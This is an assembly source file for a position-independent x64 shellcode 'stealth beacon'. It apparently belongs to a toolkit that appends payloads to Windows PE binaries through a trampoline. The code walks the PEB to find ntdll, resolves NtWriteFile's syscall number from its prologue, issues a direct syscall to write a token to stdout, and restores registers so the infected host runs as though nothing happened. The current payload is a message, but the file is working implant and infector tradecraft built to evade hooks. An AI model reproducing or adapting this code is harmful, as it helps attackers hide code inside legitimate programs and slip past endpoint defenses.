; beacon_windows.asm — PIC x64 *stealth* beacon for the Windows (PE32+) host.
;
;   The host-coupling variant of the windows payload. Entered as a function
;   call from the appender's trampoline (see tools/append_pe.py), it saves
;   every general register, walks the PEB to ntdll, reads NtWriteFile's
;   syscall number from the export prologue (`mov eax,nr; syscall` — no
;   hardcoded nr, same machinery as sleepmask.asm), writes a beacon token on
;   the process's stdout handle (PEB->Params->StandardOutput), restores
;   everything, and `ret`s so the host binary continues as if nothing
;   happened.
;
;   PIC: base (r12) resolved at entry via call/pop; every data reference is
;   [r12 + (label - sym_base)], which nasm folds to a constant displacement.
;
;   assemble: nasm -g -f bin -o build/beacon_windows.bin beacon_windows.asm

bits 64

start:
    ; save every GPR first: the host (and its loader) may be holding state in
    ; any of them, and the stealth contract is to hand back all of it
    push rax
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    ; resolve the base: call pushes the return addr (= sym_base)
    call sym_base
sym_base:
    pop r12

    ; ---- 1. PEB -> Ldr -> walk InLoadOrder for ntdll.dll -----------------
    xor rax, rax
    mov [r12 + (ntdll_base - sym_base)], rax
    mov rax, [gs:0x60]
    mov rax, [rax + 0x18]
    lea r14, [rax + 0x08]
    mov r13, [r14]
.peb_walk:
    mov rsi, [r13 + 0x58]
    mov rdx, [r13 + 0x50]
    shr rdx, 1
    lea r8, [r12 + (s_ntdll_u16 - sym_base)]
    mov r9, 9
    call cmp_u16_ci
    test rax, rax
    jz .peb_next
    mov rax, [r13 + 0x60]
    mov [r12 + (ntdll_base - sym_base)], rax
    jmp .peb_next
.peb_next:
    mov r13, [r13]
    cmp r13, r14
    je .peb_got
    jmp .peb_walk
.peb_got:
    cmp qword [r12 + (ntdll_base - sym_base)], 0
    jne .have_ntdll
    jmp .done
.have_ntdll:
    ; ---- 2. parse PE exports ---------------------------------------------
    mov r11, [r12 + (ntdll_base - sym_base)]
    mov r10d, [r11 + 0x3C]
    lea r10, [r11 + r10]
    lea r10, [r10 + 0x18]
    mov r11d, [r10 + 0x70]
    add r11, [r12 + (ntdll_base - sym_base)]
    mov r10d, [r11 + 0x10]
    mov [r12 + (num_names - sym_base)], r10
    mov r9d, [r11 + 0x14]
    mov r10, [r12 + (ntdll_base - sym_base)]
    add r10, r9
    mov [r12 + (eat_base - sym_base)], r10
    mov r9d, [r11 + 0x18]
    mov r10, [r12 + (ntdll_base - sym_base)]
    add r10, r9
    mov [r12 + (ent_base - sym_base)], r10
    mov r9d, [r11 + 0x1C]
    mov r10, [r12 + (ntdll_base - sym_base)]
    add r10, r9
    mov [r12 + (ord_base - sym_base)], r10

    ; ---- 3. resolve NtWriteFile ------------------------------------------
    lea rsi, [r12 + (s_ntwrite - sym_base)]
    mov rdx, 11
    call find_export
    mov [r12 + (ntwrite_fn - sym_base)], rax
    test rax, rax
    jz .done

    ; ---- 4. read the syscall nr from the export prologue ------------------
    mov rsi, rax
    call sysnr_from
    mov [r12 + (data_nr - sym_base)], rax

    ; ---- 5. stdout handle: PEB -> Params -> StandardOutput ----------------
    mov rax, [gs:0x60]
    mov rax, [rax + 0x20]
    mov rax, [rax + 0x28]
    mov [r12 + (stdout_hdl - sym_base)], rax

    ; ---- 6. NtWriteFile(stdout, 0, 0, 0, &iosb, msg, len, 0, 0) -----------
    sub rsp, 0x50
    lea r9, [r12 + (iosb - sym_base)]
    mov [rsp + 0x20], r9
    lea r9, [r12 + (msg - sym_base)]
    mov [rsp + 0x28], r9
    mov dword [rsp + 0x30], msglen
    mov r9d, 0
    mov [rsp + 0x38], r9
    mov [rsp + 0x40], r9
    mov rcx, [r12 + (stdout_hdl - sym_base)]
    xor rdx, rdx
    xor r8d, r8d
    mov eax, [r12 + (data_nr - sym_base)]
    syscall
    add rsp, 0x50
.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    pop rdx
    pop rcx
    pop rax
    ret

; ---------------------------------------------------------------------------
; helpers (from sleepmask.asm; find_export reads the r12-based data slots)
; ---------------------------------------------------------------------------

; cmp_ascii_ci: rsi=p1, rdx=len1, r8=p2, r9=len2 -> rax=1/0
;   clobbers rcx,r10,r11 ; preserves rsi,rdx,r8,r9
cmp_ascii_ci:
    cmp rdx, r9
    jne .caci_no
    mov r10, 0
.caci_loop:
    movzx r11, byte [rsi + r10]
    movzx rax, byte [r8 + r10]
    cmp r11, 'A'
    jb .caci_l1
    cmp r11, 'Z'
    ja .caci_l1
    add r11, 0x20
.caci_l1:
    cmp rax, 'A'
    jb .caci_l2
    cmp rax, 'Z'
    ja .caci_l2
    add rax, 0x20
.caci_l2:
    cmp r11, rax
    jne .caci_ne
    inc r10
    cmp r10, rdx
    jb .caci_loop
    mov rax, 1
    ret
.caci_ne:
    xor eax, eax
    ret
.caci_no:
    xor eax, eax
    ret

; cmp_u16_ci: rsi=p1, rdx=len1(u16), r8=p2, r9=len2(u16) -> rax=1/0
;   clobbers rcx,r10,r11 ; preserves rsi,rdx,r8,r9
cmp_u16_ci:
    cmp rdx, r9
    jne .cucu_no
    mov r10, 0
.cucu_loop:
    movzx r11, word [rsi + r10*2]
    movzx rax, word [r8 + r10*2]
    cmp r11, 'A'
    jb .cucu_l1
    cmp r11, 'Z'
    ja .cucu_l1
    add r11, 0x20
.cucu_l1:
    cmp rax, 'A'
    jb .cucu_l2
    cmp rax, 'Z'
    ja .cucu_l2
    add rax, 0x20
.cucu_l2:
    cmp r11, rax
    jne .cucu_ne
    inc r10
    cmp r10, rdx
    jb .cucu_loop
    mov rax, 1
    ret
.cucu_ne:
    xor eax, eax
    ret
.cucu_no:
    xor eax, eax
    ret

; sysnr_from: rsi=fn -> eax=nr (32-bit)
;   scans for the `B8 ?? ?? ?? ?? 0F 05` thunk, returns the imm32
sysnr_from:
    mov r10, 5
.snr_scan:
    cmp byte [rsi + r10], 0x0F
    jne .snr_next
    cmp byte [rsi + r10 + 1], 0x05
    jne .snr_next
    cmp byte [rsi + r10 - 5], 0xB8
    jne .snr_next
    mov eax, [rsi + r10 - 4]
    ret
.snr_next:
    inc r10
    cmp r10, 24
    jb .snr_scan
    xor eax, eax
    ret

; find_export: rsi=name(ascii), rdx=len -> rax=fn abs addr (0 if not found)
;   reads data: num_names, ent_base, ord_base, eat_base, ntdll_base
find_export:
    push rbx
    xor rbx, rbx
.fx_loop:
    cmp rbx, [r12 + (num_names - sym_base)]
    jae .fx_done
    mov r8, [r12 + (ent_base - sym_base)]
    mov r8d, [r8 + rbx*4]
    add r8, [r12 + (ntdll_base - sym_base)]
    xor r10, r10
.fx_sl:
    movzx r11, byte [r8 + r10]
    test r11, r11
    jz .fx_sl_done
    inc r10
    jmp .fx_sl
.fx_sl_done:
    mov r9, r10
    call cmp_ascii_ci
    test rax, rax
    jz .fx_next
    mov r9, [r12 + (ord_base - sym_base)]
    movzx r10, word [r9 + rbx*2]
    mov r9, [r12 + (eat_base - sym_base)]
    mov eax, [r9 + r10*4]
    add rax, [r12 + (ntdll_base - sym_base)]
    pop rbx
    ret
.fx_next:
    inc rbx
    jmp .fx_loop
.fx_done:
    pop rbx
    xor eax, eax
    ret

; ---------------------------------------------------------------------------
; data (qword-aligned slots; strings at the end)
; ---------------------------------------------------------------------------
iosb:         resq 2
ntdll_base:   resq 1
eat_base:     resq 1
ent_base:     resq 1
ord_base:     resq 1
num_names:    resq 1
ntwrite_fn:   resq 1
stdout_hdl:   resq 1
data_nr:      resq 1
s_ntwrite:    db "NtWriteFile", 0
s_ntdll_u16:  dw 'n','t','d','l','l','.','d','l','l'
msg:          db "sleepmask: coupled | windows x86-64 | host continues", 0x0a
msglen        equ $ - msg
